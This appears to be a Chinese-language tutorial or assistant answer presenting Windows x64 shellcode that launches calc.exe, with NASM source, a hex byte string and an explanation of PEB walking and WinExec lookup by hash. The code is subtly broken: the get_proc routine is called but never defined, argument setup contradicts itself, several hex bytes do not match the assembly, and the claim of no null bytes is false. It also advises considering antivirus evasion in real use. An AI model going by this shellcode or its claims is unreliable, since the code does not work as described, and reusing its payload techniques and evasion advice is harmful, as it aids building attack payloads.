这里我展示一个经典的 Windows x64 弹出 calc.exe 计算器的 shellcode，并详细解释其工作原理：

```nasm
; Windows x64 shellcode - 执行 calc.exe
; 大小: 95 bytes

global _start
section .text
_start:
    ; 清零寄存器
    xor rcx, rcx            ; RCX = 0
    mul rcx                 ; RAX，RDX = 0
    
    ; 构建栈空间
    push rcx                ; 压入0用于字符串结尾
    mov rax, 'calc.exe'     ; 将calc.exe字符串加载到RAX
    push rax                ; 压入栈中
    mov rdx, rsp            ; RDX指向字符串
    
    ; 准备调用WinExec
    push rcx                ; uCmdShow = SW_HIDE (0)
    push rdx                ; lpCmdLine = "calc.exe"
    mov r9, rcx            ; 第四个参数 = 0
    mov r8, rcx            ; 第三个参数 = 0
    mov rdx, 0x5           ; 第二个参数 = SW_SHOW (5)
    mov rcx, rsp           ; 第一个参数 = 指向"calc.exe"
    
    ; 获取kernel32.dll基址
    mov r10, gs:[0x60]     ; 获取PEB
    mov r10, [r10 + 0x18]  ; 获取PEB_LDR_DATA
    mov r10, [r10 + 0x20]  ; 获取InMemoryOrderModuleList
    mov r10, [r10]         ; 跳过ntdll.dll
    mov r10, [r10]         ; 获取kernel32.dll基址
    mov r10, [r10 + 0x20]  ; 保存基址
    
    ; 查找WinExec地址
    mov eax, 0xEC0E4E8E    ; WinExec函数散列
    mov rcx, r10           ; 基址作为参数
    call get_proc          ; 获取WinExec地址
    
    ; 调用WinExec
    call rax               ; 执行WinExec("calc.exe", 5)
    
    ; 退出
    ret
```

这段shellcode的十六进制表示形式：
```
\x48\x31\xc9\x48\xf7\xe1\x51\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48\x89\xe2\x51\x52\x49\x89\xc9\x49\x89\xc8\x48\xc7\xc2\x05\x00\x00\x00\x48\x89\xe1\x65\x4c\x8b\x15\x60\x00\x00\x00\x4c\x8b\x52\x18\x4c\x8b\x52\x20\x4c\x8b\x12\x4c\x8b\x12\x4c\x8b\x52\x20\xb8\x8e\x4e\x0e\xec\x4c\x89\xd1\xe8\x0b\x00\x00\x00\xff\xd0\xc3
```

主要工作原理：

1. 寄存器准备：
- 首先清零关键寄存器
- 在栈上构建"calc.exe"字符串

2. 参数准备：
- 设置WinExec函数所需参数
- 包括命令行字符串和显示参数

3. 定位kernel32.dll：
- 通过PEB遍历加载模块列表
- 获取kernel32.dll基址

4. 函数地址解析：
- 使用散列查找WinExec函数地址
- 通过导出表进行函数名匹配

5. 执行命令：
- 调用WinExec函数
- 启动计算器程序

注意事项：
1. 这是一个基础演示shellcode
2. 实际使用时需要考虑免杀和环境适配
3. 代码中不包含空字节(0x00)以避免字符串处理问题
4. 使用相对寻址保证位置无关性

这个shellcode展示了Windows下shellcode的基本编写技巧，包括：
- 系统调用方式
- PEB遍历技术
- 函数地址解析
- 参数传递约定